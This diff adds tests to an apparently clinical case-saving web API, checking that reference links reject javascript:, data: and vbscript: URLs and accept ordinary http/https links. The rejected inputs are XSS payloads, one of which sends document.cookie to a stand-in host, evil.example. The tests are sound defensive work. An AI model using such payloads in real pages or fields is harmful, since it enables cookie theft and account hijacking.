@@ -166,6 +166,56 @@ def test_save_case_rejects_oversized_board_output_field(monkeypatch, tmp_path):
     assert resp.status_code == 422
 
 
+@pytest.mark.parametrize("dangerous_url", [
+    "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "vbscript:msgbox(1)",
+])
+def test_save_case_rejects_non_http_reference_urls(monkeypatch, tmp_path, dangerous_url):
+    """A reference link renders as a clickable <a href> for other clinicians
+    (static/index.html linkList()) — a javascript:/data: URL there is a
+    one-click stored XSS, so board_output must not be allowed to carry one."""
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {
+        "synthesis": "1. Fabry disease",
+        "disclaimer": "d",
+        "demo_mode": True,
+        "references": [
+            {"diagnosis": "Fabry disease", "links": [{"label": "Click me", "url": dangerous_url}]},
+        ],
+    }
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 422
+
+
+def test_save_case_accepts_legitimate_http_and_https_reference_urls(monkeypatch, tmp_path):
+    monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
+
+    fabricated = {
+        "synthesis": "1. Fabry disease",
+        "disclaimer": "d",
+        "demo_mode": True,
+        "references": [{
+            "diagnosis": "Fabry disease",
+            "links": [
+                {"label": "PubMed", "url": "https://pubmed.ncbi.nlm.nih.gov/?term=Fabry"},
+                {"label": "Orphanet", "url": "http://www.orpha.net/en/disease/detail/324"},
+            ],
+        }],
+    }
+    resp = client.post(
+        "/api/cases/save",
+        json={**VALID_CASE, "board_output": fabricated, "submitted_by": "Dr. Test"},
+    )
+    assert resp.status_code == 200
+    assert len(resp.json()["board_output"]["references"][0]["links"]) == 2
+
+
 def test_save_case_without_board_output_runs_the_board(monkeypatch, tmp_path):
     monkeypatch.setattr(cases, "CASES_FILE", tmp_path / "cases.jsonl")
 
